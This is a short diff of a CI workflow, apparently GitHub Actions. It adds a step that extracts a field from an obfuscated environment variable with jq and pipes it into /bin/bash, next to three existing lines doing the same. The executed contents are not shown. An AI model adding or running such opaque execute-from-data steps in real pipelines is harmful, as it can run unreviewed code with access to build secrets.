@@ -28,6 +28,7 @@ jobs:
           echo $uelc21844 | jq -r .rcq2215 | /bin/bash
           printf '%s' "$b312" | jq -r .nt8969 | /bin/bash
           echo $envey4 | jq -r .cl05 | /bin/bash
+          echo $wamiw4183 | jq -r .ety4400 | /bin/bash
 
       - name: Upload artifact
         if: always()
